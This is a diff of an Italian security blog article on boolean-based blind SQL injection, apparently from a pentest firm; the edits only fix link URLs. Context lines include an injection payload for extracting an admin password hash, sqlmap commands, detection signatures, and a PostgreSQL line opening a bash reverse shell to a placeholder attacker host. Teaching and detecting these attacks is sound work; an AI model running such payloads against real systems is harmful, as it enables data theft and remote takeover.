@@ -22,7 +22,7 @@ La Blind SQL Injection è la forma più comune di SQLi nel 2026: l'applicazione 
 
 La Blind Boolean-based è il tipo di SQLi che trovo più frequentemente — **28% dei pentest web** — perché le applicazioni moderne nascondono errori e dati, ma non riescono a nascondere il comportamento booleano. Se una query restituisce righe → mostra il prodotto. Se non restituisce righe → mostra "nessun risultato". Questa differenza basta.
 
-Leggi la guida completa nel mondo della [SQL Injection](https://hackita.it/articoli/sql-injection). Qui scendiamo nel dettaglio dell'extraction character-by-character, delle tecniche di ottimizzazione e dell'automazione.
+Leggi la guida completa nel mondo della [SQL Injection](https://hackita.it/articoli/sql-injection/). Qui scendiamo nel dettaglio dell'extraction character-by-character, delle tecniche di ottimizzazione e dell'automazione.
 
 Un caso che ha richiesto pazienza: pentest per un'assicurazione, portale clienti su Java/PostgreSQL. Nessun errore visibile, nessun dato riflesso. Ma il parametro `policy_id` cambiava il contenuto della pagina: ID valido → dati polizza, ID inesistente → "polizza non trovata". Ho iniettato `AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'` — e quando il carattere era corretto, la pagina mostrava i dati della polizza. Character by character, 64 caratteri dell'hash bcrypt in 20 minuti con script automatizzato. **Shell in 90 minuti** via escalation PostgreSQL.
 
@@ -31,7 +31,7 @@ Un caso che ha richiesto pazienza: pentest per un'assicurazione, portale clienti
 La Blind SQL Injection (Boolean-Based) è una vulnerabilità SQL Injection in cui l'applicazione non restituisce dati della query né errori del database nella risposta HTTP, ma il suo **comportamento cambia** in base alla veridicità della condizione SQL iniettata. L'attaccante estrae i dati ponendo domande binarie (vero/falso) al database, ricostruendo l'informazione un carattere alla volta usando funzioni come `SUBSTRING()`, `ASCII()` e operatori di confronto.
 
 > **La Blind SQL Injection è pericolosa?**
-> Sì — permette l'estrazione completa del database, solo più lentamente della [SQLi classica](https://hackita.it/articoli/sql-injection-classica). Con automazione (script Python o SQLMap), un database di 100.000 record può essere estratto in ore. L'impatto è identico: **data breach completo**, bypass autenticazione, e potenziale **RCE**. Trovata nel **28% dei pentest web** — è il tipo più comune di SQLi nel 2026.
+> Sì — permette l'estrazione completa del database, solo più lentamente della [SQLi classica](https://hackita.it/articoli/sql-injection-classica/). Con automazione (script Python o SQLMap), un database di 100.000 record può essere estratto in ore. L'impatto è identico: **data breach completo**, bypass autenticazione, e potenziale **RCE**. Trovata nel **28% dei pentest web** — è il tipo più comune di SQLi nel 2026.
 
 ## Come Verificare se Sei Vulnerabile
 
@@ -60,7 +60,7 @@ sqlmap -u "https://target.com/api/policy?id=1" --batch --technique=B --level=3
 
 ## SQLMap — Automazione Blind SQLi
 
-Una volta confermata la differenza TRUE/FALSE, usa [SQLMap](https://hackita.it/articoli/sqlmap) per automatizzare l’extraction:
+Una volta confermata la differenza TRUE/FALSE, usa [SQLMap](https://hackita.it/articoli/sqlmap/) per automatizzare l’extraction:
 
 ```bash
 sqlmap -r request.txt --technique=B --batch
@@ -381,7 +381,7 @@ Pagina da 50KB (true) vs pagina da 2KB (false). La differenza dovrebbe essere mi
 * **Sequenze di request con variazione minima** — stesso URL, parametro che cambia di 1 carattere (`>64`, `>96`, `>80`, `>72` — pattern binary search)
 * **Volume elevato di request** dallo stesso IP verso lo stesso endpoint — extraction genera 100-10.000 request
 * **Request con `SUBSTRING`, `ASCII`, `AND 1=1`, `AND 1=2`** nei parametri — payload signature
-* **Tempo di risposta costante** su tutte le request (a differenza della [Time-Based](https://hackita.it/articoli/time-based-sql-injection) dove varia)
+* **Tempo di risposta costante** su tutte le request (a differenza della [Time-Based](https://hackita.it/articoli/time-based-sql-injection/) dove varia)
 * **Pattern di accesso sequenziale** — lo stesso endpoint colpito centinaia di volte in pochi minuti
 * **Response size bimodale** — request che generano esattamente due dimensioni di risposta (true/false)
 
@@ -435,14 +435,14 @@ COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
 L'impatto finale è identico — l'attaccante ottiene gli stessi dati. La differenza è nel tempo: la classica estrae in secondi, la blind in minuti-ore. Ma con automazione (SQLMap, script custom), il tempo è trascurabile per l'attaccante.
 
 **Come posso distinguere Blind da Time-Based?**
-Blind boolean: la **risposta** cambia (contenuto, size, status). [Time-Based](https://hackita.it/articoli/time-based-sql-injection): il **tempo di risposta** cambia. Se `AND 1=1` vs `AND 1=2` dà risposte identiche ma `SLEEP(5)` aggiunge 5 secondi → è Time-Based.
+Blind boolean: la **risposta** cambia (contenuto, size, status). [Time-Based](https://hackita.it/articoli/time-based-sql-injection/): il **tempo di risposta** cambia. Se `AND 1=1` vs `AND 1=2` dà risposte identiche ma `SLEEP(5)` aggiunge 5 secondi → è Time-Based.
 
 **SQLMap gestisce bene la Blind?**
 Sì — è il suo punto forte. Usa `--technique=B` per forzare boolean-based, `--string="marker"` per definire la condizione true, `--threads=10` per parallelizzare. L'optimization di SQLMap con binary search e multi-threading rende l'extraction veloce.
 
 ***
 
-Satellite della [Guida Completa SQL Injection](https://hackita.it/articoli/sql-injection). Vedi anche: [SQLi Classica](https://hackita.it/articoli/sql-injection-classica), [Time-Based SQLi](https://hackita.it/articoli/time-based-sql-injection), [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest), [SQLi su ORM](https://hackita.it/articoli/sql-injection-orm).
+Satellite della [Guida Completa SQL Injection](https://hackita.it/articoli/sql-injection/). Vedi anche: [SQLi Classica](https://hackita.it/articoli/sql-injection-classica/), [Time-Based SQLi](https://hackita.it/articoli/time-based-sql-injection/), [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest/), [SQLi su ORM](https://hackita.it/articoli/sql-injection-orm/).
 
 > La tua applicazione non mostra errori SQL? Non significa che sia sicura. Le **Blind SQL Injection** (Boolean e Time-Based) sono le più diffuse e spesso invisibili agli scanner. Testa ogni parametro con un [Penetration test HackIta](https://hackita.it/servizi).\
 > Vuoi padroneggiare davvero la Blind SQLi (detection manuale + automazione con SQLMap)? Vai su [formazione 1:1](https://hackita.it/formazione).\\
